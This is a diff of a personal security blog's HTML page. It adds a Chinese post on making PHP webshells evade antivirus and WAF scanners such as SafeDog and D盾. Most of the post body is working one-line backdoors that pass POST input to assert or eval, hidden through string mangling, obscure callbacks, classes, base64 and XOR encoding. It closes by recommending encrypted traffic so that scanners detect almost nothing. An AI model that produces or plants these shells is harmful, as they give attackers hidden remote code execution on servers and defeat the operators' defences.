@@ -86,16 +86,17 @@
 
 
 
-<meta name="description" content="一个兴趣使然的信息安全爱好者">
-<meta property="og:type" content="website">
-<meta property="og:title" content="MaiKeFee|">
-<meta property="og:url" content="http://MaiKeFee.com/categories/渗透测试/知识科普/奇淫技巧/Linux特性/index.html">
+<meta name="description" content="前言尽最大努力在一文中让大家掌握一些有用的WEBSHELL免杀技巧 目录1.关于eval 于 assert 2.字符串变形 3.定义函数绕过 4.回调函数 5.回调函数变形 6.特殊字符干扰 7.数组 8.类 9.编码绕过 10.无字符特征马 11.PHP7.1后webshell何去何从 12.总结关于eval 与 assert关于eval函数在php给出的官方说明是  eval 是一个语言构造器">
+<meta property="og:type" content="article">
+<meta property="og:title" content="webshell免杀套路">
+<meta property="og:url" content="http://MaiKeFee.com/archives/8cef4b76.html">
 <meta property="og:site_name" content="MaiKeFee|">
-<meta property="og:description" content="一个兴趣使然的信息安全爱好者">
+<meta property="og:description" content="前言尽最大努力在一文中让大家掌握一些有用的WEBSHELL免杀技巧 目录1.关于eval 于 assert 2.字符串变形 3.定义函数绕过 4.回调函数 5.回调函数变形 6.特殊字符干扰 7.数组 8.类 9.编码绕过 10.无字符特征马 11.PHP7.1后webshell何去何从 12.总结关于eval 与 assert关于eval函数在php给出的官方说明是  eval 是一个语言构造器">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-09-19T17:13:43.592Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MaiKeFee|">
-<meta name="twitter:description" content="一个兴趣使然的信息安全爱好者">
+<meta name="twitter:title" content="webshell免杀套路">
+<meta name="twitter:description" content="前言尽最大努力在一文中让大家掌握一些有用的WEBSHELL免杀技巧 目录1.关于eval 于 assert 2.字符串变形 3.定义函数绕过 4.回调函数 5.回调函数变形 6.特殊字符干扰 7.数组 8.类 9.编码绕过 10.无字符特征马 11.PHP7.1后webshell何去何从 12.总结关于eval 与 assert关于eval函数在php给出的官方说明是  eval 是一个语言构造器">
 
 
 
@@ -125,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://MaiKeFee.com/categories/渗透测试/知识科普/奇淫技巧/Linux特性/">
+  <link rel="canonical" href="http://MaiKeFee.com/archives/8cef4b76.html">
 
 
 
 
 
-  <title>分类: Linux特性 | MaiKeFee|</title>
+  <title>webshell免杀套路 | MaiKeFee|</title>
   
 
 
@@ -150,7 +151,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
     
 <a href="https://github.com/MaiKeFee" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#70B7FD; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
@@ -297,53 +298,454 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block category">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>Linux特性<small>分类</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://MaiKeFee.com/archives/8cef4b76.html">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="MaiKeFee">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/MaiKeFee_Logo.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="MaiKeFee|">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/archives/18ca0ec6.html" itemprop="url">
-              
-                <span itemprop="name">Linux通配符绕过文件名黑名单</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">webshell免杀套路</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T22:39:51+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-20T01:04:02+08:00">
+                2019-09-20
+              </time>
+            
 
-    </header>
-  </article>
+            
+              <span class="post-meta-divider">|</span>
+            
 
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-20T01:13:43+08:00">
+                2019-09-20
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/知识科普/" itemprop="url" rel="index">
+                    <span itemprop="name">知识科普</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/知识科普/奇淫技巧/" itemprop="url" rel="index">
+                    <span itemprop="name">奇淫技巧</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/知识科普/奇淫技巧/Waf特性/" itemprop="url" rel="index">
+                    <span itemprop="name">Waf特性</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/archives/8cef4b76.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/archives/8cef4b76.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/archives/8cef4b76.html" class="leancloud_visitors" data-flag-title="webshell免杀套路">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.7k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  6
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>尽最大努力在一文中让大家掌握一些有用的WEBSHELL免杀技巧</p>
+<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><pre><code>1.关于eval 于 assert
+2.字符串变形
+3.定义函数绕过
+4.回调函数
+5.回调函数变形
+6.特殊字符干扰
+7.数组
+8.类
+9.编码绕过
+10.无字符特征马
+11.PHP7.1后webshell何去何从
+12.总结</code></pre><h1 id="关于eval-与-assert"><a href="#关于eval-与-assert" class="headerlink" title="关于eval 与 assert"></a>关于eval 与 assert</h1><h2 id="关于eval函数"><a href="#关于eval函数" class="headerlink" title="关于eval函数"></a>关于eval函数</h2><pre><code>在php给出的官方说明是
+
+eval 是一个语言构造器而不是一个函数，不能被 可变函数 调用 
+
+可变函数：通过一个变量，获取其对应的变量值，然后通过给该值增加一个括号()，让系统认为该值是一个函数，从而当做函数来执行 通俗的说比如你&lt;?php $a=eval;$a()?&gt;这样是不行的 也造就了用eval的话达不到assert的灵活，但是在php7.1以上assert已经不行</code></pre><h2 id="关于assert函数"><a href="#关于assert函数" class="headerlink" title="关于assert函数"></a>关于assert函数</h2><pre><code>assert() 回调函数在构建自动测试套件的时候尤其有用，因为它们允许你简易地捕获传入断言的代码，并包含断言的位置信息。 
+
+当信息能够被其他方法捕获，使用断言可以让它更快更方便！</code></pre><h1 id="字符串变形"><a href="#字符串变形" class="headerlink" title="字符串变形"></a>字符串变形</h1><p>字符串变形多数用于BYPASS安全狗，相当对于D盾，安全狗更加重视”形” 一个特殊的变形就能绕过安全狗，看看PHP手册，有着很多关于操作字符串的函数</p>
+<pre><code>ucwords() //函数把字符串中每个单词的首字符转换为大写。
+ucfirst() //函数把字符串中的首字符转换为大写。
+trim() //函数从字符串的两端删除空白字符和其他预定义字符。
+substr_replace() //函数把字符串的一部分替换为另一个字符串
+substr() //函数返回字符串的一部分。
+strtr() //函数转换字符串中特定的字符。
+strtoupper() //函数把字符串转换为大写。
+strtolower() //函数把字符串转换为小写。
+strtok() //函数把字符串分割为更小的字符串
+str_rot13() //函数对字符串执行 ROT13 编码。</code></pre><p>由于PHP的灵活性操作字符串的函数很多，我这里就不一一列举了<br>用substr_replace()函数变形assert 达到免杀的效果</p>
+<pre><code>&lt;?php
+$a = substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);
+$a($_POST[&apos;x&apos;]);
+?&gt;</code></pre><p>其他函数类似 不一一列举了</p>
+<h1 id="定义函数绕过"><a href="#定义函数绕过" class="headerlink" title="定义函数绕过"></a>定义函数绕过</h1><p>定义一个函数把关键词分割达到bypass效果</p>
+<pre><code>&lt;?php
+function kdog($a){
+$a($_POST[&apos;x&apos;]);
+}
+kdog(assert);
+?&gt;</code></pre><p>反之</p>
+<pre><code>&lt;?php
+function kdog($a){
+assert($a);
+}
+kdog($_POST[x]);
+?&gt;</code></pre><blockquote>
+<p>效果一样，这种绕过方法，对安全狗还是比较有效的 在d盾面前就显得小儿科了 ，不过后面会讲到如何用定义函数的方法来 绕过d盾</p>
+</blockquote>
+<h1 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h1><pre><code>call_user_func_array()
+call_user_func()
+array_filter()
+array_walk()
+array_map()
+registregister_shutdown_function()
+register_tick_function()
+filter_var()
+filter_var_array()
+uasort()
+uksort()
+array_reduce()
+array_walk()
+array_walk_recursive()</code></pre><p>回调函数大部分已经被安全软件加入全家桶套餐 所以找到一个生僻的不常用的回调函数来执行 比如</p>
+<pre><code>&lt;?php
+    forward_static_call_array(assert,array($_POST[x]));
+?&gt;</code></pre><p>这个函数能过狗，但是D盾显示是一级</p>
+<h1 id="回调函数变形"><a href="#回调函数变形" class="headerlink" title="回调函数变形"></a>回调函数变形</h1><p>前面说过众多回调函数已经被加入豪华套餐了，怎么绕过呢，其实也很简单 那就是定义个函数 或者类来调用</p>
+<h2 id="定义一个函数"><a href="#定义一个函数" class="headerlink" title="定义一个函数"></a>定义一个函数</h2><pre><code>&lt;?php
+    function test($a,$b){
+    array_map($a,$b);
+    }
+    test(assert,array($_POST[&apos;x&apos;]));
+?&gt;    </code></pre><h2 id="定义一个类"><a href="#定义一个类" class="headerlink" title="定义一个类"></a>定义一个类</h2><pre><code>&lt;?php
+    class loveme {
+    var $a;
+    var $b;
+    function __construct($a,$b) {
+    $this-&gt;a=$a;
+    $this-&gt;b=$b;
+    }
+    function test() {
+    array_map($this-&gt;a,$this-&gt;b);
+    }
+    }
+    $p1=new loveme(assert,array($_POST[&apos;x&apos;]));
+    $p1-&gt;test();
+?&gt;</code></pre><h1 id="特殊字符干扰"><a href="#特殊字符干扰" class="headerlink" title="特殊字符干扰"></a>特殊字符干扰</h1><p>特殊字符干扰，要求是能干扰到杀软的正则判断，还要代码能执行,网上广为流传的连接符</p>
+<h2 id="初代版本"><a href="#初代版本" class="headerlink" title="初代版本"></a>初代版本</h2><pre><code>&lt;?php
+    $a = $_REQUEST[&apos;a&apos;];
+    $b = null;
+    eval($b.$a);
+?&gt;</code></pre><p>不过已经不能免杀了，利用适当的变形即可免杀 如</p>
+<pre><code>&lt;?php
+    $a = $_POST[&apos;a&apos;];
+    $b = &quot;n&quot;;
+    eval($b.=$a);
+?&gt;</code></pre><p>其他方法大家尽情发挥如”rnt”,函数返回，类，等等<br>除了连接符号 还有个命名空间的东西 具体大家可以看看php手册</p>
+<pre><code>&lt;?php
+    function dog($a){
+    assert($a);
+    }
+    dog($_POST[x]);
+?&gt;</code></pre><p>当然还有其他的符号熟读PHP手册就会有不一样的发现</p>
+<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="把执行代码放入数组中执行绕过"><a href="#把执行代码放入数组中执行绕过" class="headerlink" title="把执行代码放入数组中执行绕过"></a>把执行代码放入数组中执行绕过</h2><pre><code>&lt;?php
+$a = substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);
+$b=[&apos;&apos;=&gt;$a($_POST[&apos;q&apos;])];
+?&gt;</code></pre><h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><pre><code>&lt;?php
+$b = substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);
+$a = array($arrayName = array(&apos;a&apos; =&gt; $b($_POST[&apos;q&apos;])));
+?&gt;</code></pre><h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><p>说到类肯定要搭配上魔术方法比如<strong>destruct()，</strong>construct()直接上代码</p>
+<pre><code>&lt;?php
+class me
+{
+public $a = &apos;&apos;;
+function __destruct(){
+assert(&quot;$this-&gt;a&quot;);
+    }
+}
+$b = new me;
+$b-&gt;a = $_POST[&apos;x&apos;];
+?&gt;</code></pre><blockquote>
+<p>用类把函数包裹,D盾对类查杀较弱</p>
+</blockquote>
+<h1 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h1><p>##用php的编码函数<br>或者用异或等等 简单的base64_decode,其中因为他的正则匹配可以加入一些下划线干扰杀软</p>
+<pre><code>&lt;?php
+$a = base64_decode(&quot;YXNz+ZX____J____0&quot;);
+$a($_POST[x]);
+?&gt;</code></pre><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><pre><code>&lt;?php
+$a= (&quot;!&quot;^&quot;@&quot;).&apos;ssert&apos;;
+$a($_POST[x]);
+?&gt;</code></pre><h1 id="无字符特征马"><a href="#无字符特征马" class="headerlink" title="无字符特征马"></a>无字符特征马</h1><p>对于无特征马这里我的意思是 无字符特征</p>
+<p>利用异或,编码等方式 例如p神博客的</p>
+<pre><code>&lt;?php
+$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;); // $_=&apos;assert&apos;;
+$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;
+$___=$$__;
+$_($___[_]); // assert($_POST[_]);</code></pre><p>利用正则匹配字符 如Tab等 然后转换为字符</p>
+<p>利用POST包获取关键参数执行 例如</p>
+<pre><code>&lt;?php
+$decrpt = $_POST[&apos;x&apos;];
+$arrs = explode(&quot;|&quot;, $decrpt)[1];
+$arrs = explode(&quot;|&quot;, base64_decode($arrs));
+call_user_func($arrs[0],$arrs[1]);
+?&gt;</code></pre><h1 id="PHP7-1后webshell何去何从"><a href="#PHP7-1后webshell何去何从" class="headerlink" title="PHP7.1后webshell何去何从"></a>PHP7.1后webshell何去何从</h1><p>在php7.1后面我们已经不能使用强大的assert函数了用eval将更加注重特殊的调用方法和一些字符干扰,后期大家可能更加倾向使用大马</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于安全狗杀形，d盾杀参的思路来绕过。生僻的回调函数,特殊的加密方式,以及关键词的后传入都是不错的选择。 </p>
+<p>对于关键词的后传入对免杀安全狗，d盾，河马 等等都是不错的，后期对于菜刀的轮子，也要走向高度的自定义化 </p>
+<p>用户可以对传出的post数据进行自定义脚本加密，再由webshell进行解密获取参数，那么以现在的软WAF查杀能力 </p>
+<p>几乎为0，安全软件也需要与时俱进了。</p>
 
       
     </div>
+    
+    
+    
+   <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束❤感谢阅读-------------</div>
+    
+</div>
+    
+ </div>
+     <div>
+    
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+
+  <p><span>本文标题:</span>webshell免杀套路</p>
+  <p><span>文章作者:</span>MaiKeFee</p>
+  <p><span>发布时间:</span>2019年09月20日</p>
+  <p><span>最后更新:</span>2019年09月20日</p>
+  <p><span>原始链接:</span><a href="/archives/8cef4b76.html" title="webshell免杀套路">http://MaiKeFee.com/archives/8cef4b76.html</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://MaiKeFee.com/archives/8cef4b76.html" aria-label="复制成功！"></i></span>
+  </p>
+  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({   
+          title: "",   
+          text: '复制成功',   
+          html: false,
+          timer: 500,   
+          showConfirmButton: false
+        });
+      });
+    }));  
+</script>
+
+    
+</div>
+    
+
+    
+
+   
+
+  <footer class="post-footer">
+
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/archives/634bc943.html" rel="next" title="ProxyChains实现自动添加代理逃避检测">
+                <i class="fa fa-chevron-left"></i> ProxyChains实现自动添加代理逃避检测
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+          
+        </div>
+      
+ 
+      
+      
+    </footer>
 
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -351,6 +753,13 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
 
         </div>
         
@@ -371,8 +780,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -495,6 +913,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#目录"><span class="nav-number">2.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关于eval-与-assert"><span class="nav-number">3.</span> <span class="nav-text">关于eval 与 assert</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#关于eval函数"><span class="nav-number">3.1.</span> <span class="nav-text">关于eval函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关于assert函数"><span class="nav-number">3.2.</span> <span class="nav-text">关于assert函数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#字符串变形"><span class="nav-number">4.</span> <span class="nav-text">字符串变形</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#定义函数绕过"><span class="nav-number">5.</span> <span class="nav-text">定义函数绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#回调函数"><span class="nav-number">6.</span> <span class="nav-text">回调函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#回调函数变形"><span class="nav-number">7.</span> <span class="nav-text">回调函数变形</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#定义一个函数"><span class="nav-number">7.1.</span> <span class="nav-text">定义一个函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#定义一个类"><span class="nav-number">7.2.</span> <span class="nav-text">定义一个类</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#特殊字符干扰"><span class="nav-number">8.</span> <span class="nav-text">特殊字符干扰</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#初代版本"><span class="nav-number">8.1.</span> <span class="nav-text">初代版本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#数组"><span class="nav-number">9.</span> <span class="nav-text">数组</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#把执行代码放入数组中执行绕过"><span class="nav-number">9.1.</span> <span class="nav-text">把执行代码放入数组中执行绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#多维数组"><span class="nav-number">9.2.</span> <span class="nav-text">多维数组</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#类"><span class="nav-number">10.</span> <span class="nav-text">类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#编码绕过"><span class="nav-number">11.</span> <span class="nav-text">编码绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#异或"><span class="nav-number">11.1.</span> <span class="nav-text">异或</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#无字符特征马"><span class="nav-number">12.</span> <span class="nav-text">无字符特征马</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP7-1后webshell何去何从"><span class="nav-number">13.</span> <span class="nav-text">PHP7.1后webshell何去何从</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">14.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -651,6 +1085,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -1211,13 +1649,13 @@
       var articles = db.collection('articles')
 
       //https://hexo.io/zh-tw/docs/variables.html
-      var isPost = ''.length > 0
+      var isPost = 'webshell免杀套路'.length > 0
       var isArchive = '' === 'true'
       var isCategory = ''.length > 0
       var isTag = ''.length > 0
 
       if (isPost) { //is article page
-        var title = ''
+        var title = 'webshell免杀套路'
         var doc = articles.doc(title)
 
         getCount(doc, true).then(appendCountTo($('.post-meta')))
@@ -1225,7 +1663,7 @@
       else if (!isArchive && !isCategory && !isTag) { //is index page
         var titles = [] //array to titles
 
-        var postsstr = 'titles.push("Linux通配符绕过文件名黑名单");' //if you have a better way to get titles of posts, please change it
+        var postsstr = '' //if you have a better way to get titles of posts, please change it
         eval(postsstr)
 
         var promises = titles.map(function (title) {
